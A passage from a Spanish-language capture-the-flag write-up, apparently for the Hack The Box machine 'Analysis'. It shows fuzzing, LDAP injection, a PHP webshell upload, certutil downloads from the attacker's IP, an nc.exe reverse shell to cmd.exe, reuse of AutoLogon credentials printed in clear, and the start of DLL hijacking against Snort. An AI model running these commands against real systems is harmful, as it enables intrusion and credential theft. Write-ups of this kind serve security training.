<span class=line></span></code></pre><p>Tratamos de fuzz para encontrar subdirectorios:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>gobuster</span><span style=color:#9ecbff> dir</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> http://analysis.htb</span><span style=color:#79b8ff> -w</span><span style=color:#9ecbff> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><span style=color:#79b8ff> -t</span><span style=color:#79b8ff> 40</span></span>
<span class=line></span></code></pre><p><img alt="alt text" decoding=async height=137 loading=lazy src=/_astro/image-2.BrJctwSU_10ytzR.webp width=616></p><p>Pero no vemos nada interesante.</p><p>Podemos intentar buscar subdominios:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>ffuf</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> http://10.10.11.250</span><span style=color:#79b8ff> -H</span><span style=color:#9ecbff> "Host: FUZZ.analysis.htb"</span><span style=color:#79b8ff> -w</span><span style=color:#9ecbff> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span><span style=color:#79b8ff> -mc</span><span style=color:#9ecbff> all</span><span style=color:#79b8ff> -ac</span><span style=color:#e1e4e8> </span></span>
<span class=line></span></code></pre><p><img alt="alt text" decoding=async height=92 loading=lazy src=/_astro/image-3.DNfy9oDk_Z1aB4wQ.webp width=699></p><p><img alt="alt text" decoding=async height=381 loading=lazy src=/_astro/image-4.CuNqV99V_Z2wT4VM.webp width=966></p><p>fuzzamos este nuevo subdominio:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>gobuster</span><span style=color:#9ecbff> dir</span><span style=color:#79b8ff> -w</span><span style=color:#9ecbff> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> http://internal.analysis.htb</span><span style=color:#79b8ff> -t</span><span style=color:#79b8ff> 55</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>/users</span><span style=color:#e1e4e8>                (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 170] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/users/]</span></span>
<span class=line><span style=color:#b392f0>/dashboard</span><span style=color:#e1e4e8>            (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 174] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/]</span></span>
<span class=line><span style=color:#b392f0>/Users</span><span style=color:#e1e4e8>                (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 170] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/Users/]</span></span>
<span class=line><span style=color:#b392f0>/employees</span><span style=color:#e1e4e8>            (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 174] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/employees/]</span></span>
<span class=line><span style=color:#b392f0>/Dashboard</span><span style=color:#e1e4e8>            (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 174] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/Dashboard/]</span></span>
<span class=line></span></code></pre><p>Tambin podemos filtrar por extensiones php en estos subdirectorios:</p><ul><li>users</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>gobuster</span><span style=color:#9ecbff> dir</span><span style=color:#79b8ff> -w</span><span style=color:#9ecbff> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> http://internal.analysis.htb/users/</span><span style=color:#79b8ff> -t</span><span style=color:#79b8ff> 55</span><span style=color:#79b8ff> -x</span><span style=color:#9ecbff> php</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>/list.php</span><span style=color:#e1e4e8>             (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 17]</span></span>
<span class=line><span style=color:#b392f0>/List.php</span><span style=color:#e1e4e8>             (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 17]</span></span>
<span class=line></span></code></pre><ul><li>dashboard</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>gobuster</span><span style=color:#9ecbff> dir</span><span style=color:#79b8ff> -w</span><span style=color:#9ecbff> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> http://internal.analysis.htb/dashboard/</span><span style=color:#79b8ff> -t</span><span style=color:#79b8ff> 55</span><span style=color:#79b8ff> -x</span><span style=color:#9ecbff> php</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>/img</span><span style=color:#e1e4e8>                  (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 178] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/img/]</span></span>
<span class=line><span style=color:#b392f0>/index.php</span><span style=color:#e1e4e8>            (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 38]</span></span>
<span class=line><span style=color:#b392f0>/uploads</span><span style=color:#e1e4e8>              (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 182] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/uploads/]</span></span>
<span class=line><span style=color:#b392f0>/upload.php</span><span style=color:#e1e4e8>           (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 0]</span></span>
<span class=line><span style=color:#b392f0>/details.php</span><span style=color:#e1e4e8>          (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 35]</span></span>
<span class=line><span style=color:#b392f0>/css</span><span style=color:#e1e4e8>                  (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 178] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/css/]</span></span>
<span class=line><span style=color:#b392f0>/Index.php</span><span style=color:#e1e4e8>            (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 38]</span></span>
<span class=line><span style=color:#b392f0>/lib</span><span style=color:#e1e4e8>                  (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 178] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/lib/]</span></span>
<span class=line><span style=color:#b392f0>/form.php</span><span style=color:#e1e4e8>             (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 35]</span></span>
<span class=line><span style=color:#b392f0>/js</span><span style=color:#e1e4e8>                   (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 177] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/js/]</span></span>
<span class=line><span style=color:#b392f0>/logout.php</span><span style=color:#e1e4e8>           (Status: </span><span style=color:#79b8ff>302</span><span style=color:#e1e4e8>) [Size: 3] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> ../employees/login.php]</span></span>
<span class=line><span style=color:#b392f0>/tickets.php</span><span style=color:#e1e4e8>          (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 35]</span></span>
<span class=line><span style=color:#b392f0>/emergency.php</span><span style=color:#e1e4e8>        (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 35]</span></span>
<span class=line><span style=color:#b392f0>/IMG</span><span style=color:#e1e4e8>                  (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 178] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/IMG/]</span></span>
<span class=line><span style=color:#b392f0>/INDEX.php</span><span style=color:#e1e4e8>            (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 38]</span></span>
<span class=line><span style=color:#b392f0>/Details.php</span><span style=color:#e1e4e8>          (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 35]</span></span>
<span class=line><span style=color:#b392f0>/Form.php</span><span style=color:#e1e4e8>             (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 35]</span></span>
<span class=line><span style=color:#b392f0>/CSS</span><span style=color:#e1e4e8>                  (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 178] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/CSS/]</span></span>
<span class=line><span style=color:#b392f0>/Img</span><span style=color:#e1e4e8>                  (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 178] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/Img/]</span></span>
<span class=line><span style=color:#b392f0>/JS</span><span style=color:#e1e4e8>                   (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 177] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/JS/]</span></span>
<span class=line><span style=color:#b392f0>/Upload.php</span><span style=color:#e1e4e8>           (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 0]</span></span>
<span class=line><span style=color:#b392f0>/Uploads</span><span style=color:#e1e4e8>              (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 182] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/Uploads/]</span></span>
<span class=line><span style=color:#b392f0>/Logout.php</span><span style=color:#e1e4e8>           (Status: </span><span style=color:#79b8ff>302</span><span style=color:#e1e4e8>) [Size: 3] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> ../employees/login.php]</span></span>
<span class=line><span style=color:#b392f0>/Lib</span><span style=color:#e1e4e8>                  (Status: </span><span style=color:#79b8ff>301</span><span style=color:#e1e4e8>) [Size: 178] [--</span><span style=color:#f97583>></span><span style=color:#e1e4e8> http://internal.analysis.htb/dashboard/Lib/]</span></span>
<span class=line><span style=color:#b392f0>/Tickets.php</span><span style=color:#e1e4e8>          (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 35]</span></span>
<span class=line><span style=color:#b392f0>/Emergency.php</span><span style=color:#e1e4e8>        (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 35]</span></span>
<span class=line></span></code></pre><ul><li>employes</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>gobuster</span><span style=color:#9ecbff> dir</span><span style=color:#79b8ff> -w</span><span style=color:#9ecbff> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> http://internal.analysis.htb/employees/</span><span style=color:#79b8ff> -t</span><span style=color:#79b8ff> 55</span><span style=color:#79b8ff> -x</span><span style=color:#9ecbff> php</span></span>
<span class=line></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>/login.php</span><span style=color:#e1e4e8>            (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 1085]</span></span>
<span class=line><span style=color:#b392f0>/Login.php</span><span style=color:#e1e4e8>            (Status: </span><span style=color:#79b8ff>200</span><span style=color:#e1e4e8>) [Size: 1085]</span></span>
<span class=line></span></code></pre><p>si hacemos un curl a <a href=http://internal.analysis.htb/users/list.php>http://internal.analysis.htb/users/list.php</a></p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>curl</span><span style=color:#79b8ff> -s</span><span style=color:#9ecbff> http://internal.analysis.htb/users/list.php</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>missing</span><span style=color:#9ecbff> parameter</span></span>
<span class=line></span></code></pre><h2 id=fuzzing-para-encontrar-el-parmetro-requerido-en-la-url>Fuzzing para encontrar el parmetro requerido en la URL<a href=#fuzzing-para-encontrar-el-parmetro-requerido-en-la-url class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>vemos que la URL necesita un parmetro, por lo que vamos a fuzz este parmetro:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u </span><span style=color:#9ecbff>'http://internal.analysis.htb/users/list.php?FUZZ'</span><span style=color:#e1e4e8> -fs 17</span></span>
<span class=line></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>name</span><span style=color:#e1e4e8>                    [Status: </span><span style=color:#9ecbff>200,</span><span style=color:#9ecbff> Size:</span><span style=color:#9ecbff> 0,</span><span style=color:#9ecbff> Words:</span><span style=color:#9ecbff> 1,</span><span style=color:#9ecbff> Lines:</span><span style=color:#9ecbff> 1,</span><span style=color:#9ecbff> Duration:</span><span style=color:#9ecbff> 9807ms]</span></span>
<span class=line></span></code></pre><p>donde encontramos el parmetro llamado nombre. As que tenemos el archivo con el parmetro <code>http://internal.analysis.htb/users/list.php?name</code>.</p><p><img alt="alt text" decoding=async height=168 loading=lazy src=/_astro/image-5.CmnxHLBt_1fzwBl.webp width=1185></p><h2 id=ldap-injection>LDAP Injection<a href=#ldap-injection class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Recuerda que el servicio LDAP se estaba ejecutando en esta mquina. Buscando inyecciones LDAP en HackTricks, podramos probar algo como name=* para ver si esto devuelve algo. Si visito <a href="http://internal.analysis.htb/users/list.php?name=">http://internal.analysis.htb/users/list.php?name=</a>* para intentar una inyeccin, puedo ver un usuario:</p><p><img alt="alt text" decoding=async height=194 loading=lazy src=/_astro/image-6.BvWiuuWy_Z1tTtW5.webp width=1196></p><h2 id=script-for-ldap-injection>Script for LDAP Injection<a href=#script-for-ldap-injection class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Vamos a crear un script en C++ para automatizar la inyeccin LDAP</p><p>Primero, instalamos lo que necesitamos:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>sudo</span><span style=color:#9ecbff> apt-get</span><span style=color:#9ecbff> install</span><span style=color:#9ecbff> libcurl4-openssl-dev</span><span style=color:#9ecbff> libargparse-dev</span></span>
<span class=line></span></code></pre><p>aqu est nuestro script: <a href=https://github.com/mil4ne/auto-LDAP-Injection>https://github.com/mil4ne/auto-LDAP-Injection</a></p><p>Compilamos:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>g++</span><span style=color:#9ecbff> ldap.c++</span><span style=color:#79b8ff> -o</span><span style=color:#9ecbff> ejecutable</span><span style=color:#79b8ff> -I.</span><span style=color:#79b8ff> -lcurl</span></span>
<span class=line></span></code></pre><p>A continuacin, ejecutamos el script:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>./ejecutable</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> "http://internal.analysis.htb/users/list.php?name"</span></span>
<span class=line></span></code></pre><p>Nuestro resultado final es este <code>97NTtl*4QP96Bv</code></p><p>con las credenciales encontradas, vamos al panel que encontramos antes: <a href=http://internal.analysis.htb/employees/login.php>http://internal.analysis.htb/employees/login.php</a></p><p><img alt="alt text" decoding=async height=399 loading=lazy src=/_astro/image-7.Dtjf_ZBD_kRxCT.webp width=761></p><p>aqu hay una seccin llamada SOC Report donde podemos subir un archivo:</p><p><img alt="alt text" decoding=async height=479 loading=lazy src=/_astro/image-8.aKDipYWn_1tTJ0F.webp width=857></p><h2 id=webshell-upload>WebShell upload<a href=#webshell-upload class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>llevemos un webshell a nuestra mquina atacante, para subirlo a la web:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>wget</span><span style=color:#9ecbff> https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php</span></span>
<span class=line></span></code></pre><p>Despus de subirlo, lo encontraremos en: <a href=http://internal.analysis.htb/dashboard/uploads/webshell.php>http://internal.analysis.htb/dashboard/uploads/webshell.php</a></p><p>ahora subiremos netcat a la maquina victima para enviarnos un revshell:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>python3</span><span style=color:#79b8ff> -m</span><span style=color:#9ecbff> http.server</span></span>
<span class=line></span></code></pre><p><img alt="alt text" decoding=async height=287 loading=lazy src=/_astro/image-9.DD0n1nmQ_1IEYUF.webp width=997></p><p>con certutil.exe descargamos el nc con la ayuda de nuestro webshell:</p><p><img alt="alt text" decoding=async height=335 loading=lazy src=/_astro/image-10.DZVotnyQ_xIcgH.webp width=786></p><p>nos ponemos en modo escucha:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> rlwrap -cAr nc -lvnp 4444</span></span>
<span class=line></span></code></pre><p>Enviamos el revshell:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>C:\Users\Public\Downloads\nc.exe</span><span style=color:#79b8ff> 10.10.14.166</span><span style=color:#79b8ff> 4444</span><span style=color:#79b8ff> -e</span><span style=color:#9ecbff> C:</span><span style=color:#79b8ff>\W</span><span style=color:#9ecbff>indows</span><span style=color:#79b8ff>\S</span><span style=color:#9ecbff>ystem32</span><span style=color:#79b8ff>\c</span><span style=color:#9ecbff>md.exe</span></span>
<span class=line></span></code></pre><p>Ahora tenemos un shell</p><p><img alt="alt text" decoding=async height=168 loading=lazy src=/_astro/image-11.De8bTapk_Zv63VD.webp width=550></p><p>transferimos winpeas a nuestra mquina vctima:</p><pre class="astro-code github-dark" data-language=powershell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#79b8ff>certutil.exe</span><span style=color:#f97583> -</span><span style=color:#e1e4e8>urlcache </span><span style=color:#f97583>-split</span><span style=color:#f97583> -f</span><span style=color:#e1e4e8> http:</span><span style=color:#f97583>//</span><span style=color:#79b8ff>10.10</span><span style=color:#e1e4e8>.</span><span style=color:#79b8ff>14.166</span><span style=color:#e1e4e8>:</span><span style=color:#79b8ff>8000</span><span style=color:#f97583>/</span><span style=color:#79b8ff>winPEASx64.exe</span><span style=color:#e1e4e8> C:\Users\Public\Downloads\</span><span style=color:#79b8ff>win.exe</span></span>
<span class=line></span></code></pre><p>Lo ejecutamos:</p><pre class="astro-code github-dark" data-language=plaintext style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span>C:\Users\Public\Downloads\win.exe</span></span>
<span class=line><span></span></span></code></pre><h1 id=movimiento-lateral>Movimiento Lateral<a href=#movimiento-lateral class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><p>En nuestro resultado encontramos credenciales:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>Looking</span><span style=color:#9ecbff> for</span><span style=color:#9ecbff> AutoLogon</span><span style=color:#9ecbff> credentials</span></span>
<span class=line><span style=color:#b392f0>    Some</span><span style=color:#9ecbff> AutoLogon</span><span style=color:#9ecbff> credentials</span><span style=color:#9ecbff> were</span><span style=color:#9ecbff> found</span></span>
<span class=line><span style=color:#b392f0>    DefaultDomainName</span><span style=color:#9ecbff>             :</span><span style=color:#9ecbff>  analysis.htb.</span></span>
<span class=line><span style=color:#b392f0>    DefaultUserName</span><span style=color:#9ecbff>               :</span><span style=color:#9ecbff>  jdoe</span></span>
<span class=line><span style=color:#b392f0>    DefaultPassword</span><span style=color:#9ecbff>               :</span><span style=color:#9ecbff>  7y4Z4^</span><span style=color:#79b8ff>*</span><span style=color:#9ecbff>y9Zzj</span></span>
<span class=line></span></code></pre><p>intentamos ver si este usuario es vlido para conectarse a travs de evil-winrm.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> crackmapexec winrm 10.10.11.250 -u </span><span style=color:#9ecbff>'jdoe'</span><span style=color:#e1e4e8> -p </span><span style=color:#9ecbff>'7y4Z4^*y9Zzj'</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.250</span><span style=color:#79b8ff>    5985</span><span style=color:#9ecbff>   DC-ANALYSIS</span><span style=color:#e1e4e8>      [*] Windows 10 / Server 2019 Build 17763 (</span><span style=color:#b392f0>name:DC-ANALYSIS</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>domain:analysis.htb</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>HTTP</span><span style=color:#79b8ff>        10.10.11.250</span><span style=color:#79b8ff>    5985</span><span style=color:#9ecbff>   DC-ANALYSIS</span><span style=color:#e1e4e8>      [*] http://10.10.11.250:5985/wsman</span></span>
<span class=line><span style=color:#b392f0>WINRM</span><span style=color:#79b8ff>       10.10.11.250</span><span style=color:#79b8ff>    5985</span><span style=color:#9ecbff>   DC-ANALYSIS</span><span style=color:#e1e4e8>      [+] analysis.htb</span><span style=color:#79b8ff>\j</span><span style=color:#e1e4e8>doe:7y4Z4^</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>y9Zzj (</span><span style=color:#b392f0>Pwn3d!</span><span style=color:#e1e4e8>)</span></span>
<span class=line></span></code></pre><p>es vlido.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>evil-winrm</span><span style=color:#79b8ff> -i</span><span style=color:#79b8ff> 10.10.11.250</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> 'jdoe'</span><span style=color:#79b8ff> -p</span><span style=color:#9ecbff> '7y4Z4^*y9Zzj'</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Privilege</span><span style=color:#9ecbff> Escalation</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>si</span><span style=color:#9ecbff> volvemos</span><span style=color:#9ecbff> a</span><span style=color:#9ecbff> ejecutar</span><span style=color:#9ecbff> winpeas</span><span style=color:#9ecbff> podemos</span><span style=color:#9ecbff> ver</span><span style=color:#9ecbff> lo</span><span style=color:#9ecbff> siguiente:</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Evil-WinRM*</span><span style=color:#9ecbff> PS</span><span style=color:#9ecbff> C:</span><span style=color:#79b8ff>\U</span><span style=color:#9ecbff>sers</span><span style=color:#79b8ff>\j</span><span style=color:#9ecbff>doe</span><span style=color:#79b8ff>\D</span><span style=color:#9ecbff>ocument</span><span style=color:#e1e4e8>s</span><span style=color:#f97583>></span><span style=color:#9ecbff> C:</span><span style=color:#79b8ff>\U</span><span style=color:#9ecbff>sers</span><span style=color:#79b8ff>\j</span><span style=color:#9ecbff>doe</span><span style=color:#79b8ff>\D</span><span style=color:#9ecbff>ocuments</span><span style=color:#79b8ff>\w</span><span style=color:#9ecbff>inpeas.exe</span></span>
<span class=line></span>
<span class=line><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>SNIP</span><span style=color:#f97583>></span></span>
<span class=line><span style=color:#b392f0>Snort(Snort</span><span style=color:#e1e4e8>)[C:</span><span style=color:#79b8ff>\S</span><span style=color:#e1e4e8>nort</span><span style=color:#79b8ff>\b</span><span style=color:#e1e4e8>in</span><span style=color:#79b8ff>\s</span><span style=color:#e1e4e8>nort.exe /SERVICE] - Autoload - No quotes and Space detected</span></span>
<span class=line><span style=color:#b392f0>    Possible</span><span style=color:#9ecbff> DLL</span><span style=color:#9ecbff> Hijacking</span><span style=color:#9ecbff> in</span><span style=color:#9ecbff> binary</span><span style=color:#9ecbff> folder:</span><span style=color:#9ecbff> C:</span><span style=color:#79b8ff>\S</span><span style=color:#9ecbff>nort</span><span style=color:#79b8ff>\b</span><span style=color:#9ecbff>in</span><span style=color:#e1e4e8> (Users [AppendData/CreateDirectories </span><span style=color:#9ecbff>WriteData/CreateFiles]</span><span style=color:#e1e4e8>)</span></span>
<span class=line></span>
<span class=line><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>SNIP</span><span style=color:#f97583>></span></span>
<span class=line></span></code></pre><p>As que SNORT es una herramienta para la prevencin de intrusiones y, asumo, que debe ejecutarse con algn tipo de privilegios para ello. Parece que atacar el servicio SNORT podra ser un camino potencial para la escalada de privilegios.</p><p>La comprobacin de permisos con icacls muestra que podemos escribir en estos archivos:</p><pre class="astro-code github-dark" data-language=plaintext style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span>Evil-WinRM* PS C:\Users\jdoe\Documents> icacls C:\Snort\lib\snort_dynamicengine</span></span>
<span class=line><span></span></span>
<span class=line><span>C:\Snort\lib\snort_dynamicengine AUTORITE NT\Systme:(I)(OI)(CI)(F)</span></span>
<span class=line><span>                                 BUILTIN\Administrateurs:(I)(OI)(CI)(F)</span></span>
<span class=line><span>                                 BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)</span></span>
<span class=line><span>                                 BUILTIN\Utilisateurs:(I)(CI)(AD)</span></span>
<span class=line><span>                                 BUILTIN\Utilisateurs:(I)(CI)(WD)</span></span>
<span class=line><span>                                 CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)</span></span>
<span class=line><span></span></span>
<span class=line><span>Successfully processed 1 files; Failed processing 0 files</span></span>
<span class=line><span>*Evil-WinRM* PS C:\Users\jdoe\Documents> icacls C:\Snort\lib\snort_dynamicpreprocessor</span></span>
<span class=line><span></span></span>
<span class=line><span>C:\Snort\lib\snort_dynamicpreprocessor AUTORITE NT\Systme:(I)(OI)(CI)(F)</span></span>
<span class=line><span>                                       BUILTIN\Administrateurs:(I)(OI)(CI)(F)</span></span>
<span class=line><span>                                       BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)</span></span>
<span class=line><span>                                       BUILTIN\Utilisateurs:(I)(CI)(AD)</span></span>
<span class=line><span>                                       BUILTIN\Utilisateurs:(I)(CI)(WD)</span></span>
<span class=line><span>                                       CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)</span></span>
<span class=line><span></span></span>
<span class=line><span>Successfully processed 1 files; Failed processing 0 files</span></span>
<span class=line><span></span></span></code></pre><p>Observo que en este directorio tenemos archivos .dll, por lo que podemos intentar un secuestro de DLL:</p><pre class="astro-code github-dark" data-language=powershell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>*</span><span style=color:#e1e4e8>Evil</span><span style=color:#f97583>-</span><span style=color:#e1e4e8>WinRM</span><span style=color:#f97583>*</span><span style=color:#e1e4e8> PS C:\Users\jdoe\Documents</span><span style=color:#f97583>></span><span style=color:#79b8ff> cmd.exe</span><span style=color:#f97583> /</span><span style=color:#e1e4e8>c dir C:\Snort\lib\snort_dynamicengine</span></span>
<span class=line><span style=color:#e1e4e8> Volume </span><span style=color:#f97583>in</span><span style=color:#e1e4e8> drive C has no label.</span></span>
<span class=line><span style=color:#e1e4e8> Volume Serial Number is </span><span style=color:#79b8ff>0071</span><span style=color:#f97583>-</span><span style=color:#e1e4e8>E237</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8> Directory of C:\Snort\lib\snort_dynamicengine</span></span>
<span class=line></span>
<span class=line><span style=color:#79b8ff>07</span><span style=color:#f97583>/</span><span style=color:#79b8ff>08</span><span style=color:#f97583>/</span><span style=color:#79b8ff>2023</span><span style=color:#79b8ff>  03</span><span style=color:#e1e4e8>:</span><span style=color:#79b8ff>31</span><span style=color:#e1e4e8> PM    </span><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>DIR</span><span style=color:#f97583>></span><span style=color:#e1e4e8>          .</span></span>
<span class=line><span style=color:#79b8ff>07</span><span style=color:#f97583>/</span><span style=color:#79b8ff>08</span><span style=color:#f97583>/</span><span style=color:#79b8ff>2023</span><span style=color:#79b8ff>  03</span><span style=color:#e1e4e8>:</span><span style=color:#79b8ff>31</span><span style=color:#e1e4e8> PM    </span><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>DIR</span><span style=color:#f97583>></span><span style=color:#e1e4e8>          ..</span></span>
